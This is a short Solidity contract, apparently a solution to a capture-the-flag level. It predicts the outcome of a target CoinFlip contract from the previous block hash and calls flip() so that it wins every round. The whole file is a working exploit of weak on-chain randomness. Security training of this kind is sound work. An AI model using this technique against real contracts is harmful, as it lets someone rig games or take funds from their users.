// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract CoinFlipAttacker {
    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip cCoinflip;    

    constructor(address aCoinflip) public {
        cCoinflip = CoinFlip(aCoinflip);
    }

    function guessAndPlay() public {
        bool guess = _guessOutcome();
        cCoinflip.flip(guess);
    }

    function getConsecutiveWins() public view returns (uint256) {
        return cCoinflip.consecutiveWins();
    }

    function _guessOutcome() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        return coinFlip == 1;
    }
}